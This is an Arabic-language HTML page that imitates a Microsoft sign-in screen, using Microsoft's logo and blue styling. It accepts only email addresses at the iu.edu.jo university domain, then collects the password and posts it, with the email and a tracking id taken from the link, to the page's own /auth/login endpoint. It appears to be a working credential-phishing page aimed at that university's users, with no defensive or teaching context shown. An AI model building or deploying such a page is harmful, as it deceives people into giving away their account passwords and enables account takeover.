<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f3f2f1;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 6px;
      width: 360px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #333;
    }
    .input-group {
      position: relative;
      margin: 10px 0;
    }
    .input-group input {
      width: 100%;
      padding: 10px 35px 10px 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      text-align: left;
      direction: ltr;
    }
    .input-group .icon {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: #666;
    }
    button {
      background: #0067b8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }
    button:hover {
      background: #005a9e;
    }
    .error {
      color: red;
      margin-top: 10px;
      font-size: 14px;
    }
    .link {
      margin-top: 15px;
      display: block;
      color: #0067b8;
      text-decoration: none;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
    <h2 id="title">تسجيل الدخول باستخدام بريدك الجامعي</h2>

    <!-- الخطوة الأولى: البريد -->
    <div id="step1">
      <div class="input-group">
        <span class="icon">@</span>
        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
      </div>
      <button onclick="nextStep()">التالي</button>
      <div id="error1" class="error"></div>
    </div>

    <!-- الخطوة الثانية: كلمة المرور -->
    <form id="step2" action="/auth/login" method="POST" style="display:none;">
      <div class="input-group">
        <span class="icon">🔑</span>
        <input type="password" name="password" placeholder="كلمة المرور" required>
      </div>
      <input type="hidden" id="finalEmail" name="email">
      <input type="hidden" id="linkId" name="id">
      <button type="submit">تسجيل الدخول</button>
      <a href="#" class="link">هل نسيت كلمة المرور؟</a>
    </form>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('id');
    if (linkId) {
      document.getElementById('linkId').value = linkId;
    }

    function nextStep() {
      const email = document.getElementById('email').value.trim();
      const error1 = document.getElementById('error1');

      if (!email.endsWith('@iu.edu.jo')) {
        error1.textContent = '❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo';
        return;
      }

      // إذا البريد صحيح → الانتقال للخطوة الثانية
      document.getElementById('finalEmail').value = email;
      document.getElementById('step1').style.display = 'none';
      document.getElementById('step2').style.display = 'block';
      document.getElementById('title').textContent = email;
    }
  </script>
</body>
</html>
